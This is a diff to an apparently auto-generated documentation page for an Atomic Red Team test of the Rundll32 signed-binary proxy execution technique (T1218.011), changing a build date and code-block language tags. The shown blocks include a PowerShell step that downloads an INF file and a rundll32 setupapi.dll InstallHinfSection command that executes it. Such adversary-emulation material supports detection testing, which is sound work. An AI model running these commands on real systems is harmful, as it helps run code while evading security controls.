@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1218.011"
 attack_technique_name: "Signed Binary Proxy Execution: Rundll32"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.011/T1218.011.yaml"
-build_date: "2026-04-26 14:38:40"
+build_date: "2026-04-26 17:02:12"
 executor: "command_prompt"
 aliases:
   - "71d771cd-d6b3-4f34-bc76-a63d47a10b19"
@@ -53,13 +53,13 @@ Inf file must exist on disk at specified location ("#{inf_to_execute}")
 
 ### Prerequisite Check
 
-```text
+```powershell
 if (Test-Path "#{inf_to_execute}") {exit 0} else {exit 1}
 ```
 
 ### Get Prerequisite
 
-```text
+```powershell
 New-Item -Type Directory (split-path "#{inf_to_execute}") -ErrorAction ignore | Out-Null
 Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.011/src/T1218.011_DefaultInstall.inf" -OutFile "#{inf_to_execute}"
 ```
@@ -70,7 +70,7 @@ Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/ato
 
 ### Command
 
-```commandprompt
+```cmd
 rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 "#{inf_to_execute}"
 ```
 
